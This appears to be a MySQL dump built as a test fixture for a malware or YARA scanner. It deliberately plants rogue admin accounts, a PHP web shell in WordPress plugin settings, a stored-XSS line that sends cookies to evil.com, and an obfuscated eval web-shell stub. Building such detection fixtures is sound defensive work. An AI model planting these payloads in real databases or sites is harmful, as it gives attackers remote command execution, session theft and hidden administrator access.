-- MySQL dump 10.13
--
-- Host: localhost    Database: dummy_target
-- ------------------------------------------------------

DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `email` varchar(100) NOT NULL,
  `role` varchar(50) DEFAULT 'user',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Normal users
INSERT INTO `users` VALUES (1,'john_doe','john.doe@university.edu','user'),(2,'jane_smith','jane.smith@institute.org','editor');

-- Another normal user
INSERT INTO `users` VALUES (3,'admin_real','admin@university.edu','admin');

-- Malicious hacker hidden in the database
INSERT INTO `users` VALUES (4,'support_tech','hacker_pwned@guerrillamail.com','admin');
INSERT INTO `users` VALUES (5,'admin_siluman','root@tempmail.com','superadmin');

-- Stored XSS to RCE payloads injection
DROP TABLE IF EXISTS `wp_options`;
CREATE TABLE `wp_options` (
  `option_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `option_name` varchar(191) NOT NULL DEFAULT '',
  `option_value` longtext NOT NULL,
  PRIMARY KEY (`option_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `wp_options` VALUES (1,'siteurl','http://example.com'),(2,'home','http://example.com');
-- Payload hidden in active plugins settings
INSERT INTO `wp_options` VALUES (3,'active_plugins','a:2:{i:0;s:19:"akismet/akismet.php";i:1;s:131:"<?php system(base64_decode($_POST[\'cmd\'])); ?>";}'),(4,'admin_email','admin@example.com');

DROP TABLE IF EXISTS `articles`;
CREATE TABLE `articles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(191) NOT NULL DEFAULT '',
  `content` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `articles` VALUES (1,'Welcome to our site!','This is a normal article about our university.');
-- Payload hidden in article content (Stored XSS)
INSERT INTO `articles` VALUES (2,'Latest updates','We have updated our terms. <script>fetch("http://evil.com/steal?cookie="+document.cookie)</script> Please read them.');

-- Advanced WSO Webshell injected into cache table (YARA Should Catch This)
DROP TABLE IF EXISTS `cache`;
CREATE TABLE `cache` (
  `id` varchar(255) NOT NULL,
  `data` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `cache` VALUES ('cache_fragment_header','<!-- WSOsetcookie cache --> <?php eval(gzinflate(base64_decode("SyvNSy7JzM9TSEvMzC/KLy7WsQUA"))); ?> <!-- end cache -->');
